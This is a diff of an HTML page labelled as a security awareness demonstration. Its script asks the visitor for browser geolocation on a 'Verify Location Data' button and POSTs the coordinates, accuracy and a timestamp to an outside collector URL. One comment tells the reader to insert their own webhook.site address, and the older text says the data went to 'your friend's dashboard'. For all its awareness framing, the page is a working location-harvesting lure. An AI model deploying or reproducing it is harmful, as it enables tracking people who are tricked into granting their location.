@@ -1,59 +1,111 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Phishing Awareness Demonstration</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Awareness Test</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            padding: 40px 20px;
+            text-align: center;
+            background-color: #f9f9fb;
+            color: #333;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        h2 { color: #111; margin-top: 0; }
+        p { color: #666; font-size: 15px; line-height: 1.5; }
+        button {
+            background-color: #007aff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: background 0.2s;
+        }
+        button:hover { background-color: #0056b3; }
+        #status-message {
+            font-weight: 500;
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 6px;
+        }
+    </style>
 </head>
 <body>
-    <h2>Security Awareness Test: Location Capture Simulation</h2>
-    <p>Press the button to simulate a consented tracking demonstration.</p>
+
+<div class="container">
+    <h2>Security Awareness Demonstration</h2>
+    <p>This page simulates a security awareness scenario. Clicking the button below demonstrates how browser permission prompts protect your data.</p>
     
-    <button onclick="getLocation()">Click to Verify Location</button>
-    <p id="output">Waiting for action...</p>
+    <button onclick="startSimulation()">Verify Location Data</button>
+    <div id="status-message">Status: Ready to test</div>
+</div>
 
-    <script>
-    // PASTE YOUR UNIQUE WEBHOOK.SITE URL BETWEEN THE QUOTES BELOW
-    const webHookUrl = "https://webhook.site";
+<script>
+    // ⚠️ REPLACE THE URL BELOW WITH YOUR REAL URL FROM WEBHOOK.SITE
+    const webHookUrl = "https://chipsaregood745.github.io/Phishing-dm/";
 
-    function getLocation() {
-        document.getElementById("output").innerHTML = "Requesting permission...";
+    function startSimulation() {
+        const status = document.getElementById("status-message");
+        status.innerHTML = "Requesting permission via browser prompt...";
+        status.style.color = "#007aff";
+
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendPositionToServer, showError);
+            // Triggers the mandatory native browser security prompt
+            navigator.geolocation.getCurrentPosition(sendData, handleDenied);
         } else {
-            document.getElementById("output").innerHTML = "Geolocation not supported.";
+            status.innerHTML = "Error: Geolocation is not supported by this browser.";
+            status.style.color = "#ff3b30";
         }
     }
 
-    function sendPositionToServer(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
+    function sendData(position) {
+        const status = document.getElementById("status-message");
+        status.innerHTML = "Transmission initiated...";
 
-        document.getElementById("output").innerHTML = "Sending data to dashboard...";
+        const payload = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy_meters: position.coords.accuracy,
+            timestamp: new Date().toISOString()
+        };
 
-        // This fetch block sends the coordinates to your Webhook URL
+        // Transmit data cleanly to the destination dashboard
         fetch(webHookUrl, {
             method: "POST",
             mode: "cors",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                latitude: lat,
-                longitude: lon,
-                timestamp: new Date().toISOString()
-            })
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
         })
         .then(response => {
-            document.getElementById("output").innerHTML = "Data successfully sent to your friend's dashboard!";
+            status.innerHTML = "Success: Coordinates sent to listener dashboard.";
+            status.style.color = "#34c759";
         })
         .catch(error => {
-            document.getElementById("output").innerHTML = "Error sending data.";
-            console.error('Error:', error);
+            status.innerHTML = "Network Error: Transmission failed.";
+            status.style.color = "#ff3b30";
+            console.error('Error details:', error);
         });
     }
 
-    function showError(error) {
-        document.getElementById("output").innerHTML = "User blocked the request. No data sent.";
+    function handleDenied(error) {
+        const status = document.getElementById("status-message");
+        status.innerHTML = "Simulation Defended: User denied the location request.";
+        status.style.color = "#ff9500";
     }
-    </script>
+</script>
+
 </body>
 </html>
